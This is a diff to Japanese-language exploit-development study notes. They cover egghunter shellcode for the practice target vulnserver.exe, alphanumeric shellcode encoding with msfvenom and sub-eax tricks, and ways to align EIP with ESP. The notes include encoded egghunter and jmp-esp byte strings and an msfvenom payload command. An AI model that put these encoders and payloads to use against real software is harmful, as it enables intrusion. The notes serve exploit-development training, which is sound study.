@@ -2623,7 +2623,7 @@ vulnserver.exeで動作したOmlet-Hunterは以下。
 ```
 SEH Omlet shellcodeは以下からダウンロードできる。   
 https://code.google.com/archive/p/w32-seh-omelet-shellcode/downloads   
-### encode shellcode
+### Alpha shellcode
 ファイル名に使える文字しか使えないような場合、`0x21~0x7f`らへんしか使用できない。   
 
 その場合は、`mefvenom`の`x86/alpha_mixed`などでこれらの文字だけを使ってShellcodeを構成する必要がある。   
@@ -2662,7 +2662,6 @@ call命令でcall 0x5の次の命令のアドレスがスタックにpushされ�
    0:	d9 eb                	fldpi  
    2:	9b d9 74 24 f4       	fstenv [esp-0xc]
    7:	58                   	pop    eax
-
 ```
 #### encode with sub eaxs
 ASCIIでprint可能な`0x21~0x7f`で、それ以外の文字を置き換える方法。   
@@ -2744,9 +2743,63 @@ _start:
 ```python
 enc_egghunter = "\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x27\x5d\x55\x5d\x2d\x31\x5d\x55\x5d\x2d\x33\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x70\x2d\x5a\x6f\x2d\x70\x2e\x5a\x70\x2d\x71\x2e\x61\x70\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x28\x7e\x79\x56\x2d\x29\x7f\x7d\x57\x2d\x2d\x7f\x7d\x57\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x5b\x6c\x28\x28\x2d\x5b\x6d\x29\x29\x2d\x5b\x6d\x2d\x2d\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x41\x53\x37\x27\x2d\x41\x53\x37\x31\x2d\x42\x54\x37\x33\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x54\x37\x66\x45\x2d\x55\x38\x66\x45\x2d\x55\x38\x66\x46\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x50\x2e\x2d\x31\x2d\x50\x47\x40\x32\x2d\x51\x48\x40\x32\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x33\x28\x67\x55\x2d\x33\x29\x67\x55\x2d\x34\x2d\x67\x55\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x45\x64\x7a\x7a\x2d\x45\x64\x7a\x7a\x2d\x45\x65\x7a\x7a\x50"
 
+# 254bytes
 # "%JMNN%5211-']U]-1]U]-3^U]P%JMNN%5211-p-Zo-p.Zp-q.apP%JMNN%5211-(~yV-)\x7f}W--\x7f}WP%JMNN%5211-[l((-[m))-[m--P%JMNN%5211-AS7'-AS71-BT73P%JMNN%5211-T7fE-U8fE-U8fFP%JMNN%5211-P.-1-PG@2-QH@2P%JMNN%5211-3(gU-3)gU-4-gUP%JMNN%5211-Edzz-Edzz-EezzP"
+```
+#### set EIP=REGISTER
+**EIP==ESP**   
+```txt
+msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed BufferRegister=ESP -f py -v exploit
+でシェルコード実行前にESP==EIPとしておく
+
+[方法1] 普通にShellcode分のスペースのあるスタック上にJMPする。
+nasm > sub esp,0x200
+00000000  81EC00020000      sub esp,0x200
+nasm > jmp esp
+00000000  FFE4              jmp esp
+これをpush eaxsでEncodeした以下を使う。
+# 52bytes
+exploit += "\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x55\x55\x55\x5e\x2d\x55\x55\x55\x5e"
+exploit += "\x2d\x56\x55\x56\x5e\x50\x25\x4a\x4d\x4e\x4e\x25\x35\x32\x31\x31\x2d\x29\x58\x54\x54\x2d\x29
+exploit += "\x5a\x55\x54\x2d\x2d\x61\x55\x55\x50"
+
+[方法2] popadで32バイト(0x20)分加算する
+nasm > popad
+00000000  61                popa
+以下のように、ESPを高位のアドレスに上げる。[方法1]のEncodeされたやつを実行する直前はESPをそれより高くしておき、
+|               |
+|  enc_jmpesp   | <- これを実行すると、下(高いアドレス)に元のjmpespが復元される
+|   nop(0x41)   | 
+|    jmpesp     | <- 復元されたjmpespが現れる！このままNOPを降りていくとここを実行するようになる 
+|   nop(0x41)   |
+exploit += "\x61"*68 + "\x58"
+
+[方法3] sub eaxを使ってespの値をeaxに代入してから任意に加算減算して、espに戻す。
+        sub eaxのみが0x2dを使うためAlphaのみでも使用可能！sub espは"0x81"を使用するため使えない！
+　　　　ただし、pop espの0x5cが"\"のため、多くの場合は使えない！
+    例）eax = esp + 0x67c
+    #>>> hex((0x10000067c)*-1 & 0xffffffff )
+    #'0xfffff984'
+    #>>> hex(0x5555532b*2 + 0x5555532e)
+    #'0xfffff984'
+nasm > push esp
+00000000  54                push esp
+nasm > pop eax
+00000000  58                pop eax
+nasm > sub eax,0x5555532b
+00000000  2D2B535555        sub eax,0x5555532b
+nasm > sub eax,0x5555532b
+00000000  2D2B535555        sub eax,0x5555532b
+nasm > sub eax,0x5555532e
+00000000  2D2E535555        sub eax,0x5555532e
+nasm > push eax
+00000000  50                push eax
+nasm > pop esp
+00000000  5C                pop esp
 
 ```
+#### Egghunter
+
 ## よく見るかたまり
 #### 関数の先頭
 ```txt
